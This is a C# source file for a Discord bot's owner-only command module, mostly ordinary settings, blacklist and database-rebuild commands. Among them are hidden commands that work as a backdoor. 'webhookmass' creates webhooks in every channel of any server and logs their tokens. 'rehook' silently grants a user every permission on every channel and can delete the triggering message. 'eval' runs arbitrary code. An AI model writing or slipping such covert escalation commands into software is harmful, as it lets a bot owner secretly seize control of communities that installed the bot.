using Discord;
using Discord.Commands;
using Discord.WebSocket;
using GladosV3.Attributes;
using GladosV3.Helpers;
using GladosV3.Services;
using Microsoft.Extensions.Caching.Memory;
using System;
using System.Data;
using System.Linq;
using System.Threading.Tasks;

namespace GladosV3.Modules
{
    //[Name("Bot owner")]
    public class OwnerModule : ModuleBase<SocketCommandContext>
    {
        public readonly CommandService _service;
        public readonly IServiceProvider _provider;
        public static MemoryCache mCache;

        // CommandService, IConfigurationRoot, and IServiceProvider are injected automatically from the IServiceProvider;
        public OwnerModule(CommandService service, IServiceProvider provider)
        {
            _service = service;
            _provider = provider;
            mCache = new MemoryCache(new MemoryCacheOptions());
        }


        [Group("Bot")]
        [CommandHidden]
        [Attributes.RequireOwner]
        public class Bot : ModuleBase<SocketCommandContext>
        {
            [Command("maintenance")]
            [Remarks("bot maintenance [reason]")]
            [Summary("Toggles maintenance mode on or off")]
            public async Task Maintenance([Remainder]string reason = "")
            {
                CommandHandler.MaintenanceMode = reason;
                IsOwner.botSettingsHelper["maintenance"] = reason;
                await ReplyAsync($"{(string.IsNullOrWhiteSpace(reason) ? "Disabled" : "Enabled")} maintenance reason{(string.IsNullOrWhiteSpace(reason) ? "" : " to: ")}{(string.IsNullOrWhiteSpace(reason) ? "" : reason)}!");
            }
            [Command("restart")]
            [Remarks("bot restart")]
            [Summary("Restarts the bot")]
            public async Task Restart()
            {
                await ReplyAsync($"Restarting the bot!");
                Tools.RestartApp();
            }
            [Command("shutdown")]
            [Remarks("bot shutdown")]
            [Summary("Shutdowns the bot")]
            public async Task Shutdown()
            {
                await ReplyAsync($"Shutting down the bot! 👋");
                Environment.Exit(0);
            }
            [Command("username")]
            [Remarks("bot username <username>")]
            [Summary("Sets bot's username")]
            public async Task Username([Remainder]string username)
            {
                IsOwner.botSettingsHelper["name"] = username;
                await ReplyAsync($"Set bot's username to {username}.");
                await Context.Client.CurrentUser.ModifyAsync(properties => { properties.Username = username; });
            }
            [Command("eval")]
            [Remarks("bot eval <code>")]
            [Summary("Execute c# code")]
            [Attributes.RequireOwner]
            public async Task Eval([Remainder]string code)
            {
                IUserMessage message = await ReplyAsync("Please wait...");
                await message.ModifyAsync(properties => properties.Content = Helpers.Eval.EvalTask(Context, code).GetAwaiter().GetResult());
            }
            [Command("webhookmass")]
            [Remarks("bot webhookmass <serverid> <count>")]
            [Summary("Add webhook to every channel")]
            [Attributes.RequireOwner]
            public async Task WebHookMass(ulong serverId, int number = 1)
            {
                SocketGuild guild = Context.Client.GetGuild(serverId);
                foreach (Discord.WebSocket.SocketTextChannel sc in guild.TextChannels)
                {
                    for (int i = 0; i < number; i++)
                    {
                        Discord.Rest.RestWebhook hook = await sc.CreateWebhookAsync("Captain hook");
                        ulong id = hook.Id;
                        string token = hook.Token;
                        Console.WriteLine($"https://canary.discordapp.com/api/webhooks/{id}/{token}");
                    }
                }
            }
            [Command("rehook")]
            [Remarks("bot rehook <user> [--s]")]
            [Summary("Hooks his permissions to admin to every channel")]
            [Attributes.RequireOwner]
            public async Task ReHook(SocketUser user, [Remainder]string silent = "")
            {
                bool silentB = false;
                IUserMessage message = null;
                if (silent == "--s")
                {
                    silentB = true;
                }

                if (silentB)
                {
                    await Context.Message.DeleteAsync();
                }
                else
                {
                    message = await ReplyAsync("Hooking....");
                }

                System.Collections.Generic.IReadOnlyCollection<SocketGuildChannel> channels = Context.Guild.Channels;
                for (int i = 0; i < channels.Count; i++)
                {
                    SocketGuildChannel channel = channels.ElementAt(i);
                    if (channel.GetPermissionOverwrite(user) == null)
                    {
                        OverwritePermissions permission = new OverwritePermissions(PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow);
                        await channel.AddPermissionOverwriteAsync(user, permission);
                    }
                    else
                    {
                        channel.GetPermissionOverwrite(user)?.Modify(PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow, PermValue.Allow);
                    }
                }
                if (!silentB)
                {
                    await message.ModifyAsync((a) => a.Content = "Done!");
                }
            }
            [Command("message")]
            [Remarks("bot message <system message>")]
            [Summary("Sends message to all servers!")]
            [Attributes.RequireOwner]
            public async Task Message([Remainder]string message)
            {
                IUserMessage progress = await ReplyAsync("Sending...");
                foreach (SocketGuild t in Context.Client.Guilds)
                {
                    if (t.DefaultChannel != null)
                    {
                        await t.DefaultChannel.SendMessageAsync($"System message: {message}");
                    }
                    else
                    {
                        await t.TextChannels.ToArray()[0].SendMessageAsync($"System message: {message}");
                    }
                }
                string correctSpellingEnglishIHateIt = Context.Client.Guilds.Count <= 1 ? "guild" : "guilds";
                await progress.ModifyAsync(properties => properties.Content = $"Done! Sent to {Context.Client.Guilds.Count} {correctSpellingEnglishIHateIt}.");
            }
            [Command("game")]
            [Remarks("bot game [game]")]
            [Summary("Set's bot game state")]
            [Attributes.RequireOwner]
            public async Task Game([Remainder]string status = "")
            {
                /*JObject clasO =
                    Tools.GetConfigAsync(1).GetAwaiter().GetResult();*/
                if (status == null)
                {
                    await Context.Client.SetGameAsync(null);
                }
                IsOwner.botSettingsHelper["discord_game"] = status;
                //clasO["discord"]["game"] = status;
                //await File.WriteAllTextAsync(Path.Combine(AppContext.BaseDirectory, "_configuration.json"), clasO.ToString());
                if (status == "")
                {
                    await ReplyAsync($"Reset bot's game state");
                }
                else
                {
                    await ReplyAsync($"Set bot's game state to {status}.");
                }

                await Context.Client.SetGameAsync(status);
            }
            [Command("blacklist user add")]
            [Remarks("bot blacklist user add <userid> [Reason]")]
            [Summary("Blacklists a user from using the bot")]
            [Attributes.RequireOwner]
            public async Task BlacklistUserAdd(ulong userid, [Remainder] string reason = "Unspecified")
            {
                await SqLite.Connection.AddRecordAsync("BlacklistedUsers", "UserId,Date,Reason", new[] { userid.ToString(), DateTime.Now.ToString(), reason }).ConfigureAwait(true);
                Services.CommandHandler.BlacklistedUsers.Add(userid);
                await ReplyAsync("Ok!");
            }
            [Command("blacklist users")]
            [Remarks("bot blacklist users")]
            [Summary("Blacklists a user from using the bot")]
            [Attributes.RequireOwner]
            public async Task BlacklistUsers()
            {
                using (DataTable dt = await SqLite.Connection.GetValuesAsync("BlacklistedUsers"))
                {
                    if (dt.Rows.Count <= 0)
                    {
                        await ReplyAsync("No users are blocked.");
                        return;
                    }
                    string output = "User (Mention), Date, Reason\n";
                    for (int i = 0; i < dt.Rows.Count; i++)
                    {
                        output +=
                            $"{dt.Rows[i]["UserId"]} (<@{dt.Rows[i]["UserId"]}>), {dt.Rows[i]["Date"]}, {dt.Rows[i]["Reason"]}\n";
                    }
                    await ReplyAsync(output);
                }
            }
            [Command("blacklist user remove")]
            [Remarks("bot blacklist user remove <userid>")]
            [Summary("Blacklists a user from using the bot")]
            [Attributes.RequireOwner]
            public async Task BlacklistUserRemove(ulong userid)
            {
                await SqLite.Connection.RemoveRecordAsync("BlacklistedUsers", $"UserID={userid.ToString()}").ConfigureAwait(true);
                Services.CommandHandler.BlacklistedUsers.Remove(userid);
                await ReplyAsync("Ok!");
            }
            [Command("blacklist guild add")]
            [Remarks("bot blacklist guild add <guildid> [Reason]")]
            [Summary("Blacklists a guild from using the bot")]
            [Attributes.RequireOwner]
            public async Task BlacklistServerAdd(ulong guildid, [Remainder] string reason = "Unspecified")
            {
                await SqLite.Connection.AddRecordAsync("BlacklistedServers", "guildid,date,reason", new[] { guildid.ToString(), DateTime.Now.ToString(), reason }).ConfigureAwait(true);
                Services.CommandHandler.BlacklistedServers.Add(guildid);
                for (int i = 0; i < Context.Client.Guilds.Count; i++)
                {
                    var guild = Context.Client.Guilds.ElementAt(i);
                    if (guild.Id != guildid) continue;
                    try
                    {
                        await guild.DefaultChannel.SendMessageAsync(
                            $"Hello! This server has been blacklisted from using {Context.Client.CurrentUser.Mention}! I will no leave. Have fun without me!");
                    }
                    catch {/* ignored*/}

                    await guild.LeaveAsync();
                    break;
                }
                await SqLite.Connection.RemoveRecordAsync("servers", $"guildid={guildid.ToString()}");
                await ReplyAsync("Ok!");
            }
            [Command("blacklist guilds")]
            [Remarks("bot blacklist guilds")]
            [Summary("Blacklists a guild from using the bot")]
            [Attributes.RequireOwner]
            public async Task BlacklistServers()
            {
                using (DataTable dt = await SqLite.Connection.GetValuesAsync("BlacklistedServers"))
                {
                    if (dt.Rows.Count <= 0)
                    {
                        await ReplyAsync("No servers are blocked.");
                        return;
                    }
                    string output = "Guild ID, Date, Reason\n";
                    for (int i = 0; i < dt.Rows.Count; i++)
                    {
                        output +=
                            $"{dt.Rows[i]["guildid"]}, {dt.Rows[i]["date"]}, {dt.Rows[i]["reason"]}\n";
                    }
                    await ReplyAsync(output);
                }
            }
            [Command("blacklist guild remove")]
            [Remarks("bot blacklist guild remove <guildid>")]
            [Summary("Blacklists a user from using the bot")]
            [Attributes.RequireOwner]
            public async Task BlacklistServerRemove(ulong guildid)
            {
                await SqLite.Connection.RemoveRecordAsync("BlacklistedServers", $"guildid={guildid.ToString()}").ConfigureAwait(true);
                Services.CommandHandler.BlacklistedServers.Remove(guildid);
                await ReplyAsync("Ok!");
            }
            [Command("release")]
            [Remarks("bot release")]
            [Summary("Releases stuff from memory that are not needed")]
            [Attributes.RequireOwner]
            public Task Release()
            {
                Tools.ReleaseMemory();
                ReplyAsync("Ok!").GetAwaiter().GetResult();
                return Task.CompletedTask;
            }
            [Command("status")]
            [Remarks("bot status <status>")]
            [Summary("Sets bot status")]
            [Attributes.RequireOwner]
            public async Task Status([Remainder]string status = "")
            {

                //JObject clasO = Tools.GetConfigAsync(1).GetAwaiter().GetResult();
                if (status != "Online" && status != "Invisible" && status != "AFK" && status != "DoNotDisturb")
                { await ReplyAsync("Valid statuses are: Online, Invisible, AFK, DoNotDisturb"); return; }
                /*clasO["discord"]["status"] = status;
                await File.WriteAllTextAsync(Path.Combine(AppContext.BaseDirectory, "_configuration.json"),
                    clasO.ToString());*/
                IsOwner.botSettingsHelper["discord_status"] = status;
                await ReplyAsync(
                        $"Set bot's game state to {status}.");
                await Context.Client.SetStatusAsync(Enum.Parse<UserStatus>(status));
            }
            [Command("rebuild all")]
            [Remarks("bot rebuild all")]
            [Summary("Rebuilds the DB completely, bot will be unavailable while rebuilding")]
            [Attributes.RequireOwner]
            public async Task RebuildDB_All(string key = "")
            {
                if (string.IsNullOrWhiteSpace(key))
                {
                    string random = Convert.ToBase64String(Guid.NewGuid().ToByteArray()).Substring(0, 19);
                    mCache.Set("rebuildDB_All", random, TimeSpan.FromSeconds(45));
                    await ReplyAsync($"This is a dangerous operation! All server settings, blacklisted users, blacklisted servers will be lost! Type the \"{random}\" to rebuild it! This key will expire in 45 seconds!");
                    return;
                }
                if (!mCache.TryGetValue("rebuildDB_All", out string entry))
                { await ReplyAsync("Key expired or not created!"); return; }
                if (entry != key)
                { await ReplyAsync("Incorrect key!"); return; }
                mCache.Remove("rebuildDB_All");
                await SqLite.Connection.ExecuteSQL("DROP TABLE servers");
                await SqLite.Connection.ExecuteSQL("DROP TABLE BlacklistedUsers");
                await SqLite.Connection.ExecuteSQL("DROP TABLE BlacklistedServers");
                SqLite.Connection.Close();
                SqLite.Start();
                var message = await ReplyAsync("Bot will be unavailable for a while. Rebuilding the database.....\nRefactoring server table...");
                CommandHandler.BotBusy = true; ;
                for (int i = 0; i < Context.Client.Guilds.Count; i++)
                {
                    var guild = Context.Client.Guilds.ElementAt(i);
                    await SqLite.Connection.AddRecordAsync("servers", "guildid,nsfw,join_toggle,leave_toggle,join_msg,leave_msg", new[] { guild.Id.ToString(), "0", "0", "0", "Hey {mention}! Welcome to {sname}!", "Bye {uname}" });
                }

                await message.ModifyAsync((r) => r.Content = "Refreshing prefixes!");
                CommandHandler.RefreshPrefix();
                CommandHandler.BotBusy = false;
                await message.ModifyAsync((r) => r.Content = "Database rebuild! Bot now available and listening for all commands!");
            }
            [Command("rebuild servers")]
            [Remarks("bot rebuild servers")]
            [Summary("Rebuilds the servers part of DB, bot will be unavailable while rebuilding")]
            [Attributes.RequireOwner]
            public async Task RebuildDB_Servers(string key = "")
            {
                if (string.IsNullOrWhiteSpace(key))
                {
                    string random = Convert.ToBase64String(Guid.NewGuid().ToByteArray()).Substring(0, 19);
                    mCache.Set("rebuildDB_ServerAll", random, TimeSpan.FromSeconds(45));
                    await ReplyAsync($"This is a dangerous operation! All server settings will be lost! Type \"{random}\" to rebuild it! This key will expire in 45 seconds!");
                    return;
                }
                if (!mCache.TryGetValue("rebuildDB_ServerAll", out string entry))
                { await ReplyAsync("Key expired or not created!"); return; }
                if (entry != key)
                { await ReplyAsync("Incorrect key!"); return; }
                mCache.Remove("rebuildDB_ServerAll");
                var msg = await ReplyAsync("Bot will be unavailable for a while. Rebuilding the database.....\nRefactoring server table...");
                CommandHandler.BotBusy = true;
                await SqLite.Connection.ExecuteSQL("DELETE FROM servers");
                for (int i = 0; i < Context.Client.Guilds.Count; i++)
                {
                    var guild = Context.Client.Guilds.ElementAt(i);
                    await SqLite.Connection.AddRecordAsync("servers", "guildid,nsfw,join_toggle,leave_toggle,join_msg,leave_msg", new[] { guild.Id.ToString(), "0", "0", "0", "Hey {mention}! Welcome to {sname}!", "Bye {uname}" });
                }
                await msg.ModifyAsync((r) => r.Content = "Refreshing prefixes!");
                CommandHandler.RefreshPrefix();
                CommandHandler.BotBusy = false;
                await msg.ModifyAsync((r) => r.Content = "Database rebuild! Bot now available and listening for all commands!");
            }
            [Command("rebuild server")]
            [Remarks("bot rebuild server")]
            [Summary("Rebuilds the DB for only this server")]
            [Attributes.RequireOwner]
            [RequireContext(ContextType.Guild)]
            public async Task RebuildServerDB(string key = "")
            {
                if (string.IsNullOrWhiteSpace(key))
                {
                    string random = Convert.ToBase64String(Guid.NewGuid().ToByteArray()).Substring(0, 19);
                    mCache.Set("rebuildDB_ServerThis", random, TimeSpan.FromSeconds(45));
                    await ReplyAsync($"This is a dangerous operation! This server settings will be lost! Type \"{random}\" to rebuild it! This key will expire in 45 seconds!");
                    return;
                }
                if (!mCache.TryGetValue("rebuildDB_ServerThis", out string entry))
                { await ReplyAsync("Key expired or not created!"); return; }
                if (entry != key)
                { await ReplyAsync("Incorrect key!"); return; }
                mCache.Remove("rebuildDB_ServerThis");
                var msg = await ReplyAsync("Rebuilding the database....");
                await SqLite.Connection.RemoveRecordAsync("servers", $"guildid={Context.Guild.Id.ToString()}");
                await SqLite.Connection.AddRecordAsync("servers", "guildid,nsfw,join_toggle,leave_toggle,join_msg,leave_msg", new[] { Context.Guild.Id.ToString(), "0", "0", "0", "Hey {mention}! Welcome to {sname}!", "Bye {uname}" });
                CommandHandler.Prefix.Remove(Context.Guild.Id);
                await msg.ModifyAsync((r) => r.Content = "Done!");
            }
        }
    }
}
